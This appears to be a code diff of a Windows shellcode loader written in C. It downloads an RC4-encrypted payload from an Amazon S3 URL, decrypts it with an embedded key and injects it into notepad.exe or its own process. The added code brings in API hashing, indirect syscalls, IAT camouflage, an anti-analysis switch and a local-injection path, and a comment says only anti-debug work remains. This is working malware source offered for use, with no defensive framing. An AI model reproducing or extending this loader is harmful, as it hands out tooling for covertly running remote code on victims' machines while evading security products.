@@ -6,19 +6,42 @@
 #include "IATCamo.h"
 #include "Debug.h"
 
-#define PAYLOAD L"https://i-dont-love-daniel.s3.eu-north-1.amazonaws.com/encrypted_shellcode.bin"
+#define PAYLOAD L"https://i-dont-love-daniel.s3.eu-north-1.amazonaws.com/FORWARD.bin"
 #define PROC L"notepad.exe"
+
+
+
+//
+//
+//  ALL THAT IS LEFT IS ANTI DEBUG AND ANALYSIS
+//
+//
+
+
+// GETTING ERROR WITH NtAllocateVirtualMemory IN LOCAL INJECTION
+
+
+
+
+unsigned char ProtectedKey[] = {
+        0x8C, 0xA6, 0xDE, 0x60, 0x5C, 0x28, 0x08, 0x5A, 0x90, 0xA8, 0xAF, 0x6E, 0xB6, 0x91, 0x63, 0x81 };
+
+//
+//\
+#define VANISH
+
+//
+#define LOCAL
+
+
 
 extern API_HASHING g_Api;
 
 float _fltused = 0;
 
-#define DEBUG
 
 
 
-unsigned char ProtectedKey[] = {
-        0x54, 0xDB, 0x46, 0xF6, 0x01, 0xD1, 0x9D, 0x55, 0x5A, 0x84, 0x5A, 0xEA, 0x87, 0xFD, 0x74, 0xF1 };
 
 int main() {
 
@@ -28,24 +51,20 @@ int main() {
     HANDLE hProcess = NULL;
     HMODULE hNTDLL = NULL;
 
+
+
+
     IatCamouflage();
-
-    PRINTA("getting payload from url...\n")
-    if (!GetPayloadFromUrl(PAYLOAD, &pBytes, &sBytesSize)) {
-        return -1;
-    }
-
-
-    PRINTA("Decrypting...\n");
-    if (!Rc4EncryptionViSystemFunc032(ProtectedKey, pBytes, KEY_SIZE, sBytesSize)) {
-        return NULL;
-    }
-    PRINTA("DONE!!\n");
-
-
+#ifdef DEBUG
     PRINTA("Starting Get Module...\n\n");
+#endif
     hNTDLL = GetMod(NTDLLDLL_DJB2);
+    g_Api.pGetModuleFileNameW = (fnGetModuleFileNameW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetModuleFileNameW_JOAA);
+    g_Api.pCreateFileW = (fnCreateFileW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CreateFileW_JOAA);
     g_Api.pOpenProcess = (fnOpenProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), OpenProcess_JOAA);
+    g_Api.pSetFileInformationByHandle = (fnSetFileInformationByHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), SetFileInformationByHandle_JOAA);
+    indirectMyAss(NtProtectVirtualMemory_DJB2, hNTDLL, &NtProtectVirtualMemorySSN, &NtProtectVirtualMemorySyscall);
+    indirectMyAss(NtDelayExecution_JOAA, hNTDLL, &NtDelayExecutionSSN, &NtDelayExecutionSyscall);
     indirectMyAss(NtAllocateVirtualMemory_DJB2, hNTDLL, &NtAllocateVirtualMemorySSN, &NtAllocateVirtualMemorySyscall);
     indirectMyAss(NtCreateThreadEx_DJB2, hNTDLL, &NtCreateThreadSSN, &NtCreateThreadSyscall);
     indirectMyAss(NtWriteVirtualMemory_DJB2, hNTDLL, &NtWriteVirtualMemorySSN, &NtWriteVirtualMemorySyscall);
@@ -55,7 +74,36 @@ int main() {
     indirectMyAss(NtQuerySystemInformation_DJB2, hNTDLL, &NtQuerySystemInformationSSN, &NtQuerySystemInformationSyscall);
 
 
+#ifdef VANISH
+
+    if (!AntiAnalysis()) {
+        
+    }
+
+#endif
+
+#ifdef DEBUG
+    PRINTA("getting payload from url...\n")
+#endif 
+    if (!GetPayloadFromUrl(PAYLOAD, &pBytes, &sBytesSize)) {
+        return -1;
+    }
+
+#ifdef DEBUG
+    PRINTA("Decrypting...\n");
+#endif 
+    if (!Rc4EncryptionViSystemFunc032(ProtectedKey, pBytes, KEY_SIZE, sBytesSize)) {
+        return NULL;
+    }
+#ifdef DEBUG
+    PRINTA("DONE!!\n");
+#endif 
+
+
+#ifndef LOCAL
+#ifdef DEBUG
     PRINTA("running GetRemoteProcessHandle...\n\n");
+#endif 
     if (!GetRemoteProcessHandle(PROC, &PID, &hProcess)) {
         return -1;
     }
@@ -65,6 +113,13 @@ int main() {
     if (!injectMyAss(hProcess, PID, pBytes, sBytesSize)) {
         return -1;
     }
+#endif
+
+#ifdef LOCAL
+    if (!LocalInjection((HANDLE)-1, pBytes, sBytesSize)) {
+        return -1;
+    }
+#endif
 
 
     return 0;
